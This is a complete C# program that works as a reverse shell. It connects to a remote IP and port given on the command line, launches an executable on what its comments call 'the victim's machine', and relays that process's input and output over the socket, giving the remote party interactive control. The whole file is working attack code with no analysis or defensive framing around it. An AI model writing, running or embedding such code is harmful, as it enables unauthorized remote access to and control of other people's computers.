using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

class Program
{
    //usage Program.exe 192.168.17.129 4433 C:\path\to\your\file.exe
    static async Task Main(string[] args)
    {
        if (args.Length != 3)
        {
            Console.WriteLine("Usage: Program.exe <ip> <port> <filename>");
            return;
        }

        string ip = args[0];
        int port;
        if (!int.TryParse(args[1], out port))
        {
            Console.WriteLine("Invalid port number. Please provide a valid port.");
            return;
        }

        string fileName = args[2];
        if (!File.Exists(fileName))
        {
            Console.WriteLine("File does not exist. Please provide a valid file name.");
            return;
        }

        try
        {
            // Connect to the specified IP address and port
            using (TcpClient client = new TcpClient())
            {
                await client.ConnectAsync(ip, port);

                // Get the network stream for the TCP connection
                using (NetworkStream networkStream = client.GetStream())
                using (StreamWriter writer = new StreamWriter(networkStream, Encoding.UTF8, 4096, true))
                using (StreamReader reader = new StreamReader(networkStream, Encoding.UTF8, false, 4096, true))
                {
                    // Start the specified file on the victim's machine
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = fileName,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                    };

                    using (Process process = new Process())
                    {
                        process.StartInfo = startInfo;

                        // Start the process
                        process.Start();

                        // Redirect the process's standard output and error asynchronously
                        Task outputTask = CopyToStreamAsync(process.StandardOutput.BaseStream, networkStream);
                        Task errorTask = CopyToStreamAsync(process.StandardError.BaseStream, networkStream);

                        // Start a separate task to read input from the console and send it to the victim's machine
                        Task inputTask = CopyToStreamAsync(networkStream, process.StandardInput.BaseStream);

                        // Wait for all tasks to complete
                        await Task.WhenAll(outputTask, errorTask, inputTask);

                        // Wait until the process exits.
                        process.WaitForExit();
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }

    // Helper method to asynchronously copy data from one stream to another
    private static async Task CopyToStreamAsync(Stream source, Stream destination)
    {
        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = await source.ReadAsync(buffer, 0, buffer.Length)) > 0)
        {
            await destination.WriteAsync(buffer, 0, bytesRead);
        }
    }
}
